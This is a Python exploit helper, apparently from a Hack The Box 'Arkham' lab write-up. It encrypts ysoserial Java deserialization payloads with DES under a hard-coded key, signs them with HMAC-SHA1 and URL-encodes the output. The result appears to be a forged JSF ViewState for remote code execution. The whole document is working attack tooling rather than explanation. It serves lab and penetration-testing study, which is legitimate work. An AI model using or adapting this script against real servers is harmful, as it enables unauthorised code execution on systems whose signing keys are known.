#!/usr/bin/python3
import sys
import hmac
from urllib import parse
from base64 import b64encode
from hashlib import sha1
from pyDes import *

'''
Write-up : https://0xrick.github.io/hack-the-box/arkham/

Script used to encrypt ysoserial payloads
'''

YELLOW = "\033[93m"
GREEN = "\033[32m"

def encrypt(payload,key):
	cipher = des(key, ECB, IV=None, pad=None, padmode=PAD_PKCS5)
	enc_payload = cipher.encrypt(payload)
	return enc_payload

def hmac_sig(enc_payload,key):
	hmac_sig = hmac.new(key, enc_payload, sha1)
	hmac_sig = hmac_sig.digest()
	return hmac_sig

key = b'JsF9876-'

if len(sys.argv) != 3 :
	print(YELLOW + "[!] Usage : {} [Payload File] [Output File]".format(sys.argv[0]))
else:
	with open(sys.argv[1], "rb") as f:
		payload = f.read()
		f.close()
	print(YELLOW + "[+] Encrypting payload")
	print(YELLOW + "  [!] Key : JsF9876-\n")
	enc_payload = encrypt(payload,key)
	print(YELLOW + "[+] Creating HMAC signature")
	hmac_sig = hmac_sig(enc_payload,key)
	print(YELLOW + "[+] Appending signature to the encrypted payload\n")
	payload = b64encode(enc_payload + hmac_sig)
	payload = parse.quote_plus(payload)
	print(YELLOW + "[*] Final payload : {}\n".format(payload))
	with open(sys.argv[2], "w") as f:
		f.write(payload)
		f.close()
	print(GREEN + "[*] Saved to : {}".format(sys.argv[2]))